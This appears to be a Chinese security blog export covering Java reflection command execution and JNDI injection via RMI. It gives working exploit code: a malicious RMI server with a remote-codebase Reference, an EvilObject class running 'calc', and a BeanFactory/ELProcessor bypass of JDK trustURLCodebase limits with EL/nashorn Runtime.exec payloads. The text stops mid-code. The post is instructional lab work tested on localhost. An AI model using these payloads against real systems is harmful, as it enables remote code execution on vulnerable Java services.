<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221330679.png" alt="image-20210721221330679"></p>
<p>可见我们创建了一个<code>ProcessBuilder</code>的<code>instance</code>，同时向其中传入了我们需要执行的命令<code>cmdArray</code>，<code>cmdArray</code>也是以<code>String[]</code>的类型传入的。</p>
<p>进入<code>Processbuilder</code>可以看到它有两个<code>constructor</code>，一个是传入有参数的(<code>List&lt;String&gt;类型</code>)，一个是传入无参数的(<code>String[]类型</code>),注意,这里<code>String...</code>等价于<code>String[]</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721222648669.png" alt="image-20210721222648669"></p>
<p>再看<code>start()</code>方法</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221932382.png" alt="image-20210721221932382"></p>
<p>传入的<code>command</code>又会被转化为<code>Array</code>，最后开始创建子程序执行等等（就不深入探究了）</p>
<p>综上所述，我们只需要执行<code>new ProcessBuilder.start()</code>即可完成命令执行</p>
<p>于是我们写出如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; processBuilderClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);<span class="comment">//获取到ProcessBuilder这个class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> processBuilderClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>);<span class="comment">//获取到start()这个方法</span></span><br><span class="line"><span class="comment">//因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oWithArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;ipconfig&quot;</span>,<span class="string">&quot;/all&quot;</span>));<span class="comment">//获取带参数的命令的instance</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oNoArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(String[].class).newInstance((Object) <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ipconfig&quot;</span>&#125;);<span class="comment">//获取不带参数的命令的instance</span></span><br><span class="line">Process argStart=(Process) start.invoke(oWithArg);</span><br><span class="line">Process noArgStart=(Process) start.invoke(oNoArg);</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">argIn</span> <span class="operator">=</span> argStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">noArgIn</span> <span class="operator">=</span> noArgStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line">InputStreamReader argReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(argIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">InputStreamReader noArgReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(noArgIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">BufferedReader argBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(argReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line">BufferedReader noArgBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(noArgReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line"></span><br><span class="line">String line=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((line=argBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((line=noArgBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721232833104.png" alt="image-20210721232833104"></p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul>
<li><p>Java反射机制是Java这个静态语言中的动态特性，它让我们能够获取到、执行任意类的方法、变量，也能创建任意类的对象。</p>
</li>
<li><p><code>Class</code>被初始化时会自动执行<code>static&#123;&#125;</code>中的内容，此处可以被利用。</p>
</li>
<li><p><code>Declared</code>关键字让我们可以获取处继承类以外的所有方法。</p>
</li>
<li><p><code>setAccessible(true)</code>可以访问private方法，不被<code>java</code>语言进行访问检测。</p>
</li>
<li><p>我们可以通过Java反射机制利用Runtime和ProcessBuilder执行命令</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal - Java 反序列化漏洞(2) – Java 反射机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之JNDI注入详解(9)</title>
    <url>/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们在爆出的Java相关的漏洞复现中经常遇到JNDI注入，比如在最近的<strong>log4j2</strong>命令执行漏洞中就涉及到JNDI注入。</p>
<p>此篇文章将详细讲解JNDI注入原理、与RMI和LDAP等服务配合注入的例子。</p>
<span id="more"></span>

<h1 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h1><blockquote>
<p>JNDI是 Java 命名与目录接口（Java Naming and Directory Interface）</p>
</blockquote>
<p>之前我们有提到过<strong>RMI</strong>的概念，但在实际安全测试中，RMI远程动态类加载的条件十分苛刻，这一点在<a href="https://leihehehe.github.io/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/">Java反序列化漏洞之利用链分析集合(4)</a>中的<strong>codebase命令执行</strong>有提到。</p>
<blockquote>
<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services.</p>
</blockquote>
<p>JNDI实际上就是提供一个API接口，让客户端能够用一个name来访问到不同的服务。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/t01316219a49d6d613b.png" alt="img"></p>
<p>通过上图可以发现，JNDI architecture由四个部分组成, 而之前提到的<strong>RMI动态加载类</strong>便是直接发生在<strong>SPI接口</strong>上</p>
<h1 id="JNDI-Reference-RMI"><a href="#JNDI-Reference-RMI" class="headerlink" title="JNDI Reference + RMI"></a>JNDI Reference + RMI</h1><h2 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h2><blockquote>
<p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. </p>
<p>For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object.</p>
</blockquote>
<p>我们希望通过java序列化的方式来得到远程的object，但有时候可能不会成功。因此JNDI提出了<strong>Naming references</strong> - 即返回一个reference，该reference会在<strong>Naming Manager</strong>上被解析（而非SPI接口上）， 最后再由JNDI的请求端去加载指定地址上的object。</p>
<p>关键点在于，当我们使用<strong>Naming references</strong>时，动态加载的过程将不再发生在<strong>SPI</strong>上，因此我们之前提到的RMI的codebase动态加载的限制不复存在，但我们也有了在<strong>Naming Manager上的新的限制：</strong>com.sun.jndi.rmi.object.trustURLCodebase需要设为<strong>true</strong>，否则将无法客户端加载codebase上的远程类(默认为false)</p>
<blockquote>
<p><strong>JDK 6u141、7u131、8u121之后：</strong>增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
</blockquote>
<h2 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h2><p>此处我们将伪造一个<strong>LocateRegistry</strong>，返回恶意的Reference object</p>
<p><strong>JNDIServer.java</strong>(攻击方)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException, NamingException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);<span class="comment">//创建恶意reference,恶意类的地址在127.0.0.1:8080 -&gt;也就是codebase</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);<span class="comment">//</span></span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处Reference类并不继承UnicastRemoteObject，所以我们需要用ReferenceWrapper来对其进行包装 - ReferenceWrapper是继承UnicastRemoteObject的且可被序列化。</p>
<p>随后将恶意reference绑定在RMI LocateRegistry上即可。</p>
<p><strong>TEST.java</strong>(被攻击方)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//新建InitialContext</span></span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);<span class="comment">//访问RMI服务，请求返回EvilObject</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>EvilObject.java(恶意类)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们在Intellij中build project,我们需要模拟的是攻击方JNDIServer.class与EvilObject.class(恶意类)均不和TEST.class放在一起，否则Test.class会在本地找到EvilObject.class,从而不会下载并加载codebase指向的恶意class</p>
<p>在生成的<strong>EvilObject.class</strong>下使用python启动web服务</p>
<p><code>python -m http.server 8080</code></p>
<p>随后运行<strong>JNDIServer</strong>和<strong>TEST</strong>，计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150021023.png" alt="image-20211213150021023"></p>
<h2 id="lookup流程分析"><a href="#lookup流程分析" class="headerlink" title="lookup流程分析"></a>lookup流程分析</h2><p>限制可能很多人会有困惑，为什么一个**context.lookup()**就能触发反序列化漏洞呢？</p>
<p>我们对Test类调试一下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150159372.png" alt="image-20211213150159372"></p>
<p>F7单步步入，</p>
<p>看一下堆栈<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150616099.png" alt="image-20211213150616099"></p>
<p>前面流程太多就不分析了，我们注意到在<strong>RegistryContext.lookup()<strong>中，我们从registery得到了Reference类型的<code>obj</code>，随后返回了</strong>decodeObject()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150948072.png" alt="image-20211213150948072"></p>
<p>我们再在decodeObject处下个断点，跟进去看看是什么</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151220258.png" alt="image-20211213151220258"></p>
<p>继续跟到getObjectInstance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151347130.png" alt="image-20211213151347130"></p>
<p>继续跟进<code>getObjectFactoryFromReference()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151656449.png" alt="image-20211213151656449"></p>
<p>最后计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151546025.png" alt="image-20211213151546025"></p>
<h1 id="JNDI-RMI绕过高版本JDK限制"><a href="#JNDI-RMI绕过高版本JDK限制" class="headerlink" title="JNDI+RMI绕过高版本JDK限制"></a>JNDI+RMI绕过高版本JDK限制</h1><h2 id="由来-1"><a href="#由来-1" class="headerlink" title="由来"></a>由来</h2><p><strong>JDK 6u141、7u131、8u121之后：</strong>增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p>
<p>那有没有什么办法能够绕过这样的限制呢？</p>
<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>我将JAVA版本切换到<strong>1.8.0_181</strong>，删除掉之前设置的<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</code></p>
<p><strong>被攻击方 TEST.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行后提示：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215154956341.png" alt="image-20211215154956341"></p>
<p>我们下断点来跟一下具体是怎么检测的。</p>
<p>一直跟到<strong>decodeObject()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215155320815.png" alt="image-20211215155320815"></p>
<p>此处会check传过来的instance里是否有FactoryClassLocation，同时checktrustURLCodebase是否为flase，如果满足以上条件，则抛出异常。我们已知<strong>trustURLCodebase</strong>是无法改变的，因为我们之前在客户端并未设置<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</code>，所以该variable一定是<strong>false</strong>。但是我们可以让传过来的reference不带FactoryClassLocation,这样就不会抛出异常了。</p>
<p>继续往下看，我们发现，当我们绕过了这个if statement以后，会进入<strong>NamingManager.getObjectInstance()</strong></p>
<p>我们先修改一下server端，在继续来调试一下看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>));<span class="comment">//去掉了FactoryLocation，先随便写</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215161517089.png" alt="image-20211215161517089"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215161924194.png" alt="image-20211215161924194"></p>
<p>我们再看回Server的代码，我们发现构造reference的时候可以传入factory，但是后面还需要factoryLocation,我们直接传null就好了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162132105.png" alt="image-20211215162132105"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;EvilObject&quot;</span>,<span class="literal">null</span>);<span class="comment">//这里的className和factory都是暂时的，只是为了搞清楚流程</span></span><br><span class="line">        <span class="comment">//Reference reference = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http://127.0.0.1:8080/&quot;);</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次调试客户端：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162526558.png" alt="image-20211215162526558"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162856640.png" alt="image-20211215162856640"></p>
<p>在最后一行，根据加载的class返回了一个<strong>ObjectFactory</strong>类型的instance。 因此，我们需要寻找一个客户端本地存在的实现ObjectFactory类的class来利用，同时构造函数得是无参构造函数。</p>
<p>光是构造了一个instance并不够，因为客户端上不可能有一个我们已经放上去的恶意类，要不然也太简单了。</p>
<p>继续返回<strong>NamingManager.getObjectInstance()</strong></p>
<p>我们发现，在获取到factory instance后，还执行了factory的getObjectInstance方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215163846004.png" alt="image-20211215163846004"></p>
<p>那么我们现在确定需要找到满足以下条件的<strong>class</strong>:</p>
<ul>
<li>implements ObjectFactory class</li>
<li>有【无参构造函数】</li>
<li>其**getObjectInstance()**方法能有办法执行RCE命令</li>
</ul>
<p>接下来就是漫漫长路…</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215165054737.png" alt="image-20211215165054737"></p>
<h2 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h2><p>可能是经验太少了，见得也少，对这种能够执行RCE的类的敏感度还不够高，我自己没能第一眼找出来可以利用的类，这里借鉴网上的文章，得知BeanFactory可以作为这个被我们利用的class。</p>
<p>我们继续分析。</p>
<p>在**BeanFactory.getObjectInstance()**中，我们往下翻，看到了反射，说明该类确实是可能被我们所利用的</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215165843328.png" alt="image-20211215165843328"></p>
<p>我们从开头看起：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215214221020.png" alt="image-20211215214221020">，首先RMIserver返回的应该是<strong>ResourceRef类</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215170157571.png" alt="image-20211215170157571"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215215944762.png" alt="image-20211215215944762"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215172007623.png" alt="image-20211215172007623"></p>
<p>那么我们现在又需要找一个class作为beanclass，且该class的构造函数为无参构造函数，执行方法的parameter类型需要为String</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215172428526.png" alt="image-20211215172428526"></p>
<p>自然我们想到了<strong>EL表达式</strong></p>
<p>下面是<strong>EL表达式</strong>执行<strong>calc</strong>的写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 下面的三种poc都可以 */</span></span><br><span class="line"></span><br><span class="line">String poc1=<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">String poc2=<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc3</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +<span class="string">&quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot;</span> +<span class="string">&quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ELProcessor</span>().eval(poc1);</span><br></pre></td></tr></table></figure>

<p>一切都分析完毕，我们可以开始构造server端的代码了。</p>
<h2 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h2><p><strong>恶意Server端构造:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass())&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(&#x27;JavaScript&#x27;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;hello=eval&quot;</span>));<span class="comment">//此处等号前面的hello必须和下一行的hello一样，因为等号前面的string会被放入hashmap作为key</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;hello&quot;</span>,poc));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span 